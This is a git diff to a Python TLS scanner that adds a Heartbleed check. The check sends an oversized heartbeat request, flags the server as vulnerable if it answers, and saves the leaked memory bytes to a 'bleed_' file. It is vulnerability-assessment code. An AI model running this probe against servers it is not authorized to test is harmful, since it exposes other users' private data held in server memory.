@@ -32,15 +32,8 @@ def TCPConnect(target):
 		exit(1)
 	return sock
 
-#def getaddrinfo(*args):
-#    return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (args[0], args[1]))]
 # 
 # Function that deliver ClientHello and return the server response if any
-#
-# parameters = ( target, cipher_code, TLSversion,
-#         tls_fallback_enabled, compression_enabled,
-#         secure_renegotiation, time_to_wait, serve_name )
-# 
 # return (version, server_response) if accepted else None
 # 
 def send_client_hello(tls_scan_obj):
@@ -71,14 +64,23 @@ def send_client_hello(tls_scan_obj):
 
 	sleep(float(tls_scan_obj.time_to_wait)/1000)
 	sock.sendall(str(packet))
-	
 	try:
 		resp = sock.recv(10240)
 	except socket.error as msg:
 		"socket error: " + str(msg.errno)
 		return None
-	sock.close()
+	
+	if tls_scan_obj.tls_heartbleed:
+		p = TLSRecord(version=tls_scan_obj.version)/TLSHeartBeat(length=2**14-1,data='bleeding...')
+		sock.sendall(str(p))
+		try:
+			resp = sock.recv(8192)
+		except socket.error as msg:
+			return (tls_scan_obj.version, str(msg.errno))	
+		sock.close()
+		return (tls_scan_obj.version, resp)
 
+	sock.close()
 	ssl_p = SSL(resp)
 	#ssl_p.show()
 	if ssl_p.haslayer(TLSServerHello) or ssl_p.haslayer(TLSAlert) or ssl_p.haslayer(TLSCertificate):
@@ -141,7 +143,7 @@ class SCAN_PARAMS:
 
 class TLSScanObject(object):
 	def __init__(self, target, server_name, cipher_list=range(0xff), version="TLS_1_1", tls_fallback=False,
-					tls_compression=False, tls_sec_reneg=False, tls_heartbeat=False, time_to_wait=0):
+					tls_compression=False, tls_sec_reneg=False, tls_heartbeat=False, tls_heartbleed=False, time_to_wait=0):
 		self.target = target
 		self.cipher_list = cipher_list
 		self.version=version
@@ -149,6 +151,7 @@ class TLSScanObject(object):
 		self.tls_compression = tls_compression
 		self.tls_sec_reneg = tls_sec_reneg
 		self.tls_heartbeat = tls_heartbeat
+		self.tls_heartbleed = tls_heartbleed
 		self.time_to_wait = time_to_wait
 		self.server_name = server_name
 
@@ -170,7 +173,8 @@ class TLSScanner(object):
 		self.torify = torify
 		if self.torify:
 			self._set_tor_proxy()
-		self.target = (self.hostname, target[1])
+		self.target = (socket.gethostbyname(self.hostname) if not torify
+							 else self.hostname, target[1])
 		self.scan_mode = None
 		#timing variable
 		self.time_delay = time_delay
@@ -191,7 +195,7 @@ class TLSScanner(object):
 		self.SECURE_RENEGOTIATION = None
 		self.COMPRESSION_ENABLED = None
 		self.tls_heartbeat = None
-		self.tls_heartbleed = None
+		self.tls_heartbleed = False
 		self.bad_sni_check = None
 		self.hsts = None
 		self.http_status_code = None
@@ -220,6 +224,7 @@ class TLSScanner(object):
 		#self.scan_protocol_versions()
 		#self._check_bad_sni_response()
 		#self._check_heartbeat()
+		#self._check_heartbleed()
 	
 
 	def _set_tor_proxy(self):
@@ -278,6 +283,10 @@ class TLSScanner(object):
 	def _check_heartbeat(self):
 		if len(self.SUPP_PROTO) == 0:
 			self._scan_protocol_versions()
+			if "TLS_1_1" not in self.SUPP_PROTO or "TLS_1_2" not in self.SUPP_PROTO:
+				self.tls_heartbeat = False
+				return
+		print "checking TLS heartbeat extension...  ",
 		ver = self.SUPP_PROTO[::-1][0]
 		a = timeit.default_timer()
 
@@ -286,6 +295,36 @@ class TLSScanner(object):
 		resp = SSL(resp)
 
 		self.tls_heartbeat = True if resp.haslayer(TLSExtHeartbeat) else False
+
+		print "\t\t\tdone. ",
+		print "in --- %0.4f seconds ---" % float(timeit.default_timer()-a)
+		if self.tls_heartbeat:
+			self._check_heartbleed()
+
+	def _check_heartbleed(self):
+		print "checking TLS heartbleed...           ", 
+		ver = self.SUPP_PROTO[::-1][0]
+		a = timeit.default_timer()
+		tls_scan_obj = TLSScanObject(target=self.target, version=ver, server_name=self.hostname, tls_heartbleed=True)
+		ver, resp = send_client_hello(tls_scan_obj)
+		
+		resp2 = SSL(resp)
+		#resp2.show()
+		self.tls_heartbleed = False
+		if len(resp) == 0:
+			#print "nothing returned"
+			pass
+		elif resp == str(104):
+			#print "connection reset by peer"
+			pass
+		elif resp2.haslayer(TLSAlert):
+			if resp2.getlayer(TLSAlert).description == 10:
+				pass
+				#unexpected msg
+		else:
+			self.tls_heartbleed = True
+			with file("bleed_" + self.hostname + ".txt", "w") as f:
+				f.write(repr(resp))
 
 		print "\t\t\tdone. ",
 		print "in --- %0.4f seconds ---" % float(timeit.default_timer()-a)
@@ -646,6 +685,9 @@ class TLSScanner(object):
 		if self.tls_heartbeat != None:
 			print "\nTLS Heartbeat extension supported?",
 			print "Yes" if self.tls_heartbeat else "No"
+		if self.tls_heartbleed != None:
+			print "\nHeartbleed vulnerable?", 
+			print self._textColor("YES",bcolors.RED) if self.tls_heartbleed else self._textColor("NO", bcolors.OKGREEN)
 		#printing HSTS header info
 		if self.hsts != None:
 			self._print_hsts_results()
